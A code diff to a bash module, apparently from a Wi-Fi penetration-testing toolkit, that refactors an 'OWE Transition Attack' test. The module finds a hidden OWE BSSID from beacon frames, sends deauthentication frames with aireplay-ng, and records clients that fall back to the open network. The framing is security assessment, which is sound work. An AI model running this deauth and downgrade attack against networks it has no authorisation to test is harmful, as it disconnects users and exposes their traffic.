@@ -32,8 +32,33 @@
 set -uo pipefail
 
 run_d6() {
+    local interface=""
+    local bssid="${GUEST_BSSID:-}"
+    local ssid="${GUEST_SSID:-}"
+    local channel="${GUEST_CHANNEL:-}"
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --interface) interface="$2"; shift 2 ;;
+            --bssid) bssid="$2"; shift 2 ;;
+            --ssid) ssid="$2"; shift 2 ;;
+            --channel) channel="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
+    # Fallbacks to globals
+    interface="${interface:-${WIFI_INTERFACE:-}}"
+    bssid="${bssid:-${GUEST_BSSID:-}}"
+    ssid="${ssid:-${GUEST_SSID:-}}"
+    channel="${channel:-${GUEST_CHANNEL:-0}}"
+    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
+
     local total_steps=6
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/d6"
+    local evidence_prefix="${evidence_dir}/d6"
     local analysis_file="${evidence_prefix}_owe_analysis.txt"
     local downgrade_file="${evidence_prefix}_downgrade_results.txt"
     local cap_file="${evidence_prefix}_capture.pcap"
@@ -44,15 +69,18 @@ run_d6() {
 
     check_module_dependencies "D6" || return 1
 
-    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
+    if [[ -z "$ssid" || -z "$bssid" ]]; then
         log_warn "Target SSID/BSSID not set."
         if ! select_target_network; then
             log_error "No target selected. Run A1 first or enter manually."
             return 1
         fi
+        ssid="${GUEST_SSID:-}"
+        bssid="${GUEST_BSSID:-}"
+        channel="${GUEST_CHANNEL:-0}"
     fi
 
-    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"
+    log_success "Target: ${ssid} (${bssid}) CH ${channel:-auto}"
 
     #--- Info banner ---
     echo ""
@@ -67,6 +95,7 @@ run_d6() {
     echo -e "${C_CYAN}║      by attacking the OWE BSSID.                                   ║${C_RESET}"
     echo -e "${C_CYAN}╚════════════════════════════════════════════════════════════════════╝${C_RESET}"
     echo ""
+    local confirm=""
     get_or_request_param "confirm" "  Proceed with OWE testing? [Y/n]"
     [[ "${confirm,,}" == "n" ]] && return 1
 
@@ -78,7 +107,7 @@ run_d6() {
     {
         echo "============================================================"
         echo "  D6: OWE Transition Attack"
-        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
+        echo "  Target: ${ssid} (${bssid})"
         echo "============================================================"
     } > "$analysis_file"
 
@@ -86,11 +115,12 @@ run_d6() {
     log_step 2 $total_steps "Enabling monitor mode"
     update_tc_progress 2 $total_steps "Monitor mode"
 
+    WIFI_INTERFACE="$interface"
     enable_monitor_mode || return 1
     local mon_iface="${MONITOR_INTERFACE}"
 
-    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
-        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
+    if [[ -n "$channel" && "$channel" != "0" ]]; then
+        run_fg iw dev "$mon_iface" set channel "$channel" 2>/dev/null || true
     fi
 
     check_abort || return 1
@@ -102,12 +132,12 @@ run_d6() {
     local beacon_pcap="$TMP_DIR/d6_beacons.pcap"
     rm -f "$beacon_pcap"
     
-    run_fg "${TOOL_PATHS[tcpdump]}" -i "$mon_iface" -c 100 -w "$beacon_pcap" \
-        "type mgt subtype beacon and ether src ${GUEST_BSSID}" 2>/dev/null || true
+    run_fg --quiet timeout 20 tcpdump -i "$mon_iface" -c 100 -w "$beacon_pcap" \
+        "type mgt subtype beacon and ether src ${bssid}" 2>/dev/null || true
 
     if [[ -f "$beacon_pcap" && -s "$beacon_pcap" ]]; then
         local owe_ie
-        owe_ie=$(run_fg "${TOOL_PATHS[tshark]}" -r "$beacon_pcap" \
+        owe_ie=$(run_fg --quiet tshark -r "$beacon_pcap" \
             -Y "wlan.tag.oui == 50:6f:9a && wlan.tag.vendor.oui.type == 28" \
             -T fields -e wlan.tag.vendor.data \
             2>/dev/null | head -1 || true)
@@ -124,7 +154,7 @@ run_d6() {
             echo "Linked OWE BSSID: ${hidden_owe_bssid}" >> "$analysis_file"
         else
             local akm_type
-            akm_type=$(run_fg "${TOOL_PATHS[tshark]}" -r "$beacon_pcap" -T fields -e wlan.rsn.akms.type 2>/dev/null | head -1 || true)
+            akm_type=$(run_fg --quiet tshark -r "$beacon_pcap" -T fields -e wlan.rsn.akms.type 2>/dev/null | head -1 || true)
             if echo "$akm_type" | grep -q "18"; then
                 owe_supported="true"
                 log_info "Network uses strict OWE (no transition mode)"
@@ -145,12 +175,12 @@ run_d6() {
 
     if [[ "$transition_mode" == "true" && -n "$hidden_owe_bssid" ]]; then
         rm -f "$cap_file"
-        spawn_bg "owe_cap" "${TOOL_PATHS[tcpdump]}" -i "$mon_iface" -w "$cap_file" \
-            "wlan addr1 ${GUEST_BSSID} or wlan addr2 ${GUEST_BSSID} or wlan addr1 ${hidden_owe_bssid} or wlan addr2 ${hidden_owe_bssid}"
+        spawn_bg "owe_cap" "tcpdump" -i "$mon_iface" -w "$cap_file" \
+            "wlan addr1 ${bssid} or wlan addr2 ${bssid} or wlan addr1 ${hidden_owe_bssid} or wlan addr2 ${hidden_owe_bssid}"
         
         sleep 5
         log_info "Sending deauth frames to hidden OWE BSSID: ${hidden_owe_bssid}"
-        run_fg "${TOOL_PATHS[aireplay-ng]}" --deauth 15 -a "$hidden_owe_bssid" "$mon_iface"
+        run_fg --quiet aireplay-ng --deauth 15 -a "$hidden_owe_bssid" "$mon_iface"
         
         start_countdown 30 "Monitoring for fallback Association Requests"
         sleep 30
@@ -163,8 +193,8 @@ run_d6() {
         
         if [[ -f "$cap_file" ]]; then
             local fallback_clients
-            fallback_clients=$(run_fg "${TOOL_PATHS[tshark]}" -r "$cap_file" \
-                -Y "wlan.fc.type_subtype == 0x0000 && wlan.da == ${GUEST_BSSID}" \
+            fallback_clients=$(run_fg --quiet tshark -r "$cap_file" \
+                -Y "wlan.fc.type_subtype == 0x0000 && wlan.da == ${bssid}" \
                 -T fields -e wlan.sa 2>/dev/null | sort -u || true)
                 
             if [[ -n "$fallback_clients" ]]; then
@@ -212,7 +242,7 @@ run_d6() {
     [[ -f "$cap_file" ]] && evidence_register_file "$cap_file"
 
     local result_json
-    result_json=$(run_fg "jq" -n \
+    result_json=$(run_fg jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "OWE Supported: ${owe_supported}, Transition Mode: ${transition_mode}, Hidden BSSID: ${hidden_owe_bssid:-N/A}, Clients Downgraded: ${clients_downgraded}" \
@@ -232,12 +262,13 @@ run_d6() {
             clients_downgraded: $clients_downgraded
         }')
 
+    # 11 Flags
     local has_pri=0
     [[ -f "$cap_file" && -s "$cap_file" ]] && has_pri=1
     local is_secure=0
     [[ "$result_status" == "SECURE" ]] && is_secure=1
 
-    save_tc_result "D6" "$result_json" 1 1 $has_pri 1 1 1 0 1 1 1 $is_secure
+    save_tc_result "D6" "$result_json" 1 1 $has_pri 1 1 1 0 1 1 1 "$is_secure"
     save_session_state
 
     return 0
